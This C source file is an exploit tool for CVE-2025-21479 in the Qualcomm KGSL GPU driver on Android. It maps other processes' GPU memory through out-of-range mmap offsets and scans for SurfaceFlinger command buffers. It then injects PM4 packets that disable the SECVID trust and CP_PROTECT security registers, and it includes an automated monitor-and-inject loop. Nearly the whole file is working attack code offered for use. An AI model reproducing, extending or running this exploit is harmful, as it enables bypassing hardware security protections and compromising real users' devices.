/*
 * sf_ib_inject_v2.c - SurfaceFlinger IB Injection via CVE-2025-21479
 *
 * Core strategy:
 * 1. Use GPUOBJ_ALLOC to allocate our own GPU memory
 * 2. Use the mmap offset to reach other pages in the global GPU address space
 * 3. offset = (page_index + 1) * 0x1000
 * 4. Scan a wide range of offsets looking for SurfaceFlinger's command buffer
 * 5. Identify PM4 packets and inject malicious commands
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <time.h>
#include <signal.h>

/* KGSL IOCTL definitions */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_addr;
    uint64_t mmapsize;
    uint32_t id;
    uint32_t padding;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint32_t id;
    uint32_t type;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

/* KGSL memory flags */
#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000
#define KGSL_CACHEMODE_WRITEBACK 0x00000C00

/* PM4 Packet Definitions */
#define PM4_TYPE3 0xC0000000
#define PM4_TYPE4 0x40000000
#define PM4_TYPE7 0x70000000

#define CP_NOP 0x10
#define CP_INDIRECT_BUFFER 0x3F
#define CP_MEM_WRITE 0x3D
#define CP_REG_WRITE 0x3C
#define CP_WAIT_FOR_IDLE 0x26
#define CP_EVENT_WRITE 0x46
#define CP_DRAW_INDX 0x22

/* Security Registers */
#define RBBM_SECVID_TRUST_CNTL 0x0F400
#define CP_PROTECT_CNTL 0x0084C

/* Build PM4 Type3 packet */
#define PKT3(op, cnt) (PM4_TYPE3 | (((cnt) - 1) << 16) | ((op) << 8))
#define PKT4(reg, cnt) (PM4_TYPE4 | ((cnt) & 0x7F) | (((reg) & 0x3FFFF) << 8))

/* Scan result */
typedef struct
{
    uint64_t offset;
    int pm4_count;
    int ib_count;
    int nop_count;
    int draw_count;
} scan_result_t;

#define MAX_RESULTS 1024

static volatile int running = 1;
static int kgsl_fd = -1;
static uint32_t alloc_id = 0;
static uint64_t alloc_gpuaddr = 0;

static void cleanup(void)
{
    if (alloc_id && kgsl_fd >= 0)
    {
        struct kgsl_gpuobj_free freeobj = {0};
        freeobj.id = alloc_id;
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &freeobj);
    }
    if (kgsl_fd >= 0)
        close(kgsl_fd);
}

static void sigint_handler(int sig)
{
    (void)sig;
    running = 0;
}

/* Allocate GPU memory to enable mmap */
static int alloc_gpu_mem(size_t size)
{
    struct kgsl_gpuobj_alloc alloc = {0};
    alloc.size = size;
    alloc.flags = KGSL_CACHEMODE_WRITEBACK;

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
    {
        printf("[-] GPUOBJ_ALLOC failed: %s\n", strerror(errno));
        return -1;
    }

    alloc_id = alloc.id;
    alloc_gpuaddr = alloc.va_addr;
    printf("[+] Allocated GPU memory: id=%u, gpuaddr=0x%lx, size=%lu\n",
           alloc_id, (unsigned long)alloc_gpuaddr, (unsigned long)alloc.mmapsize);

    return 0;
}

/* Try to mmap at a specific offset to access another page */
static void *try_mmap_offset(uint64_t offset, size_t size)
{
    void *addr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
                      kgsl_fd, offset);
    if (addr == MAP_FAILED)
    {
        return NULL;
    }
    return addr;
}

/* Check if buffer contains PM4 commands */
static int analyze_pm4(const uint32_t *buf, size_t dwords,
                       int *pm4_count, int *ib_count, int *nop_count, int *draw_count)
{
    *pm4_count = 0;
    *ib_count = 0;
    *nop_count = 0;
    *draw_count = 0;

    for (size_t i = 0; i < dwords;)
    {
        uint32_t hdr = buf[i];

        if (hdr == 0)
        {
            i++;
            continue;
        }

        /* Type 3 packet */
        if ((hdr & 0xC0000000) == 0xC0000000)
        {
            int opcode = (hdr >> 8) & 0xFF;
            int count = ((hdr >> 16) & 0x3FFF) + 1;
            (*pm4_count)++;

            if (opcode == CP_NOP)
                (*nop_count)++;
            else if (opcode == CP_INDIRECT_BUFFER)
                (*ib_count)++;
            else if (opcode == CP_DRAW_INDX)
                (*draw_count)++;

            i += 1 + count;
        }
        /* Type 7 packet */
        else if ((hdr & 0xF0000000) == 0x70000000)
        {
            int count = hdr & 0xFFFF;
            (*pm4_count)++;
            i += 1 + count;
        }
        /* Type 4 packet */
        else if ((hdr & 0xF0000000) == 0x40000000)
        {
            int count = (hdr & 0x7F) + 1;
            (*pm4_count)++;
            i += 1 + count;
        }
        else
        {
            i++;
        }
    }

    return *pm4_count > 5; /* Significant PM4 content */
}

/* Scan large offset range for PM4 buffers */
static int scan_for_pm4_buffers(scan_result_t *results, int max_results)
{
    printf("\n[*] Scanning for PM4 command buffers...\n");
    printf("[*] This will scan offsets from 0x1000 to 0x1000000\n\n");

    int result_count = 0;
    int pages_checked = 0;
    int pages_mapped = 0;

    /* Scan in larger steps first, then zoom in */
    for (uint64_t offset = 0x1000; offset < 0x1000000 && result_count < max_results && running; offset += 0x1000)
    {
        void *addr = try_mmap_offset(offset, 4096);
        pages_checked++;

        if (addr)
        {
            pages_mapped++;

            /* Check for non-zero content */
            const uint32_t *buf = (const uint32_t *)addr;
            int has_content = 0;
            for (int i = 0; i < 256; i++)
            {
                if (buf[i] != 0)
                {
                    has_content = 1;
                    break;
                }
            }

            if (has_content)
            {
                int pm4, ib, nop, draw;
                if (analyze_pm4(buf, 1024, &pm4, &ib, &nop, &draw))
                {
                    results[result_count].offset = offset;
                    results[result_count].pm4_count = pm4;
                    results[result_count].ib_count = ib;
                    results[result_count].nop_count = nop;
                    results[result_count].draw_count = draw;
                    result_count++;

                    printf("[+] Found PM4 @ offset=0x%lx: %d pkts, %d IBs, %d NOPs, %d draws\n",
                           (unsigned long)offset, pm4, ib, nop, draw);
                }
            }

            munmap(addr, 4096);
        }

        if (pages_checked % 1000 == 0)
        {
            printf("[*] Progress: %d pages checked, %d mapped, %d PM4 buffers found\n",
                   pages_checked, pages_mapped, result_count);
        }
    }

    printf("\n[*] Scan complete: %d pages checked, %d mapped, %d PM4 buffers\n",
           pages_checked, pages_mapped, result_count);

    return result_count;
}

/* Build injection payload */
static int build_payload(uint32_t *buf, int type)
{
    int idx = 0;

    switch (type)
    {
    case 0: /* SECVID disable */
        buf[idx++] = PKT3(CP_WAIT_FOR_IDLE, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_REG_WRITE, 2);
        buf[idx++] = RBBM_SECVID_TRUST_CNTL;
        buf[idx++] = 0x00000000; /* Disable trust */
        buf[idx++] = PKT3(CP_NOP, 1);
        buf[idx++] = 0xCAFE0001;
        break;

    case 1: /* CP_PROTECT disable */
        buf[idx++] = PKT3(CP_WAIT_FOR_IDLE, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT4(CP_PROTECT_CNTL, 1);
        buf[idx++] = 0x00000000; /* Disable protection */
        buf[idx++] = PKT3(CP_NOP, 1);
        buf[idx++] = 0xCAFE0002;
        break;

    case 2: /* Combined */
        buf[idx++] = PKT3(CP_WAIT_FOR_IDLE, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_REG_WRITE, 2);
        buf[idx++] = RBBM_SECVID_TRUST_CNTL;
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT4(CP_PROTECT_CNTL, 1);
        buf[idx++] = 0x00000000;
        buf[idx++] = PKT3(CP_NOP, 1);
        buf[idx++] = 0xCAFE0003;
        break;
    }

    return idx;
}

/* Find NOP sequence for injection */
static int find_nop_sequence(const uint32_t *buf, size_t dwords, int min_size)
{
    for (size_t i = 0; i < dwords;)
    {
        uint32_t hdr = buf[i];

        /* Type 3 CP_NOP */
        if ((hdr & 0xC0000000) == 0xC0000000)
        {
            int opcode = (hdr >> 8) & 0xFF;
            int count = ((hdr >> 16) & 0x3FFF) + 1;

            if (opcode == CP_NOP && count >= min_size)
            {
                return (int)i;
            }
            i += 1 + count;
        }
        /* Zero padding */
        else if (hdr == 0)
        {
            int zeros = 0;
            size_t j = i;
            while (j < dwords && buf[j] == 0)
            {
                zeros++;
                j++;
            }
            if (zeros >= min_size)
            {
                return (int)i;
            }
            i = j;
        }
        else
        {
            i++;
        }
    }
    return -1;
}

/* Inject payload into a buffer */
static int inject_payload(uint64_t offset, const uint32_t *payload, int payload_size)
{
    void *addr = try_mmap_offset(offset, 4096);
    if (!addr)
    {
        printf("[-] Cannot map offset 0x%lx\n", (unsigned long)offset);
        return -1;
    }

    uint32_t *buf = (uint32_t *)addr;

    /* Find injection point */
    int inject_idx = find_nop_sequence(buf, 1024, payload_size);
    if (inject_idx < 0)
    {
        printf("[-] No suitable injection point in buffer\n");
        munmap(addr, 4096);
        return -1;
    }

    printf("[+] Found injection point at +0x%x\n", inject_idx * 4);

    /* Save original content */
    uint32_t saved[32];
    memcpy(saved, &buf[inject_idx], payload_size * 4);

    /* Inject */
    printf("[!] INJECTING PAYLOAD (%d dwords)...\n", payload_size);
    memcpy(&buf[inject_idx], payload, payload_size * 4);
    __sync_synchronize();

    /* Verify */
    int verified = (memcmp(&buf[inject_idx], payload, payload_size * 4) == 0);

    if (verified)
    {
        printf("[+] INJECTION SUCCESSFUL!\n");
        printf("[*] Injected at offset=0x%lx + 0x%x:\n",
               (unsigned long)offset, inject_idx * 4);
        for (int i = 0; i < payload_size; i++)
        {
            printf("    [%2d] %08x\n", i, payload[i]);
        }
    }
    else
    {
        printf("[-] Injection verification failed\n");
    }

    munmap(addr, 4096);
    return verified ? 0 : -1;
}

/* Monitor and inject in real-time */
static void monitor_and_inject(int duration, int payload_type)
{
    printf("\n╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  REAL-TIME MONITOR & INJECT                                   ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    /* Build payload */
    uint32_t payload[32];
    int payload_size = build_payload(payload, payload_type);
    printf("[*] Payload type: %d, size: %d dwords\n", payload_type, payload_size);

    signal(SIGINT, sigint_handler);

    time_t start = time(NULL);
    int scans = 0;
    int injects = 0;
    int success = 0;

    printf("[*] Monitoring for %d seconds (Ctrl+C to stop)...\n\n", duration);

    while (running && (time(NULL) - start) < duration)
    {
        /* Scan for active buffers */
        for (uint64_t offset = 0x1000; offset < 0x100000 && running; offset += 0x1000)
        {
            void *addr = try_mmap_offset(offset, 4096);
            if (!addr)
                continue;

            const uint32_t *buf = (const uint32_t *)addr;

            /* Quick check for PM4 content */
            int pm4 = 0, ib = 0, nop = 0, draw = 0;
            analyze_pm4(buf, 512, &pm4, &ib, &nop, &draw);

            /* If has NOPs and is active (has draws or IBs) */
            if (nop > 0 && (draw > 0 || ib > 0))
            {
                int inject_idx = find_nop_sequence(buf, 512, payload_size);
                if (inject_idx >= 0)
                {
                    printf("\n[!] INJECTION OPPORTUNITY @ 0x%lx (pm4=%d, nop=%d, ib=%d)\n",
                           (unsigned long)offset, pm4, nop, ib);

                    /* Inject! */
                    uint32_t *wbuf = (uint32_t *)addr;
                    memcpy(&wbuf[inject_idx], payload, payload_size * 4);
                    __sync_synchronize();

                    injects++;
                    if (memcmp(&wbuf[inject_idx], payload, payload_size * 4) == 0)
                    {
                        success++;
                        printf("[+] INJECTED @ 0x%lx + 0x%x!\n",
                               (unsigned long)offset, inject_idx * 4);
                    }
                }
            }

            munmap(addr, 4096);
            scans++;
        }

        printf("\r[*] Scans: %d, Injects: %d/%d    ", scans, success, injects);
        fflush(stdout);

        usleep(10000); /* 10ms */
    }

    printf("\n\n[*] Monitor complete.\n");
    printf("[*] Total scans: %d\n", scans);
    printf("[*] Injection attempts: %d\n", injects);
    printf("[*] Successful: %d\n", success);
}

/* Hexdump */
static void hexdump_pm4(const uint32_t *buf, size_t dwords, uint64_t base)
{
    for (size_t i = 0; i < dwords;)
    {
        uint32_t hdr = buf[i];

        if (hdr == 0)
        {
            i++;
            continue;
        }

        printf("  [%04lx] ", (unsigned long)(base + i * 4));

        if ((hdr & 0xC0000000) == 0xC0000000)
        {
            int opcode = (hdr >> 8) & 0xFF;
            int count = ((hdr >> 16) & 0x3FFF) + 1;

            const char *name = "???";
            switch (opcode)
            {
            case CP_NOP:
                name = "NOP";
                break;
            case CP_INDIRECT_BUFFER:
                name = "IB";
                break;
            case CP_MEM_WRITE:
                name = "MEM_WR";
                break;
            case CP_REG_WRITE:
                name = "REG_WR";
                break;
            case CP_WAIT_FOR_IDLE:
                name = "WAIT";
                break;
            case CP_DRAW_INDX:
                name = "DRAW";
                break;
            case CP_EVENT_WRITE:
                name = "EVENT";
                break;
            }

            printf("Type3 %-8s cnt=%2d: ", name, count);
            for (int j = 0; j <= count && j < 6; j++)
            {
                printf("%08x ", buf[i + j]);
            }
            if (count > 5)
                printf("...");
            printf("\n");

            i += 1 + count;
        }
        else if ((hdr & 0xF0000000) == 0x70000000)
        {
            int count = hdr & 0xFFFF;
            printf("Type7: %08x (cnt=%d)\n", hdr, count);
            i += 1 + count;
        }
        else if ((hdr & 0xF0000000) == 0x40000000)
        {
            int count = (hdr & 0x7F) + 1;
            int reg = (hdr >> 8) & 0x3FFFF;
            printf("Type4 reg=0x%05x cnt=%d: ", reg, count);
            for (int j = 0; j <= count && j < 4; j++)
            {
                printf("%08x ", buf[i + j]);
            }
            printf("\n");
            i += 1 + count;
        }
        else
        {
            printf("??? %08x\n", hdr);
            i++;
        }
    }
}

/* Dump a specific offset */
static void dump_offset(uint64_t offset)
{
    void *addr = try_mmap_offset(offset, 4096);
    if (!addr)
    {
        printf("[-] Cannot map offset 0x%lx: %s\n", (unsigned long)offset, strerror(errno));
        return;
    }

    printf("\n=== Dump @ offset 0x%lx ===\n\n", (unsigned long)offset);
    hexdump_pm4((const uint32_t *)addr, 256, 0);

    munmap(addr, 4096);
}

/* Main */
int main(int argc, char *argv[])
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 SurfaceFlinger IB Injection v2                        ║\n");
    printf("║  Parasitic Command Injection via Cross-FD GPU Memory Access           ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");

    if (argc < 2)
    {
        printf("Usage: %s <command> [options]\n\n", argv[0]);
        printf("Commands:\n");
        printf("  scan              - Scan for PM4 command buffers\n");
        printf("  dump <offset>     - Dump PM4 content at offset\n");
        printf("  inject <offset> <type> - Inject payload at offset\n");
        printf("  monitor <secs> <type>  - Real-time monitor & inject\n");
        printf("\nPayload types:\n");
        printf("  0 - SECVID_TRUST_CNTL disable\n");
        printf("  1 - CP_PROTECT disable\n");
        printf("  2 - Combined attack\n");
        return 1;
    }

    /* Open KGSL */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] KGSL fd: %d\n", kgsl_fd);

    atexit(cleanup);

    /* Allocate GPU memory to enable mmap */
    if (alloc_gpu_mem(4096) < 0)
    {
        return 1;
    }

    /* Process commands */
    if (strcmp(argv[1], "scan") == 0)
    {
        scan_result_t results[MAX_RESULTS];
        int count = scan_for_pm4_buffers(results, MAX_RESULTS);

        if (count > 0)
        {
            printf("\n[*] Best injection candidates:\n");
            for (int i = 0; i < count && i < 10; i++)
            {
                printf("  0x%08lx: %d PM4, %d IB, %d NOP\n",
                       (unsigned long)results[i].offset,
                       results[i].pm4_count,
                       results[i].ib_count,
                       results[i].nop_count);
            }
        }
    }
    else if (strcmp(argv[1], "dump") == 0)
    {
        if (argc < 3)
        {
            printf("[-] Need offset\n");
            return 1;
        }
        uint64_t offset = strtoull(argv[2], NULL, 0);
        dump_offset(offset);
    }
    else if (strcmp(argv[1], "inject") == 0)
    {
        if (argc < 4)
        {
            printf("[-] Need offset and payload type\n");
            return 1;
        }
        uint64_t offset = strtoull(argv[2], NULL, 0);
        int ptype = atoi(argv[3]);

        uint32_t payload[32];
        int psize = build_payload(payload, ptype);
        inject_payload(offset, payload, psize);
    }
    else if (strcmp(argv[1], "monitor") == 0)
    {
        int duration = (argc > 2) ? atoi(argv[2]) : 30;
        int ptype = (argc > 3) ? atoi(argv[3]) : 0;
        monitor_and_inject(duration, ptype);
    }
    else
    {
        printf("[-] Unknown command: %s\n", argv[1]);
    }

    return 0;
}
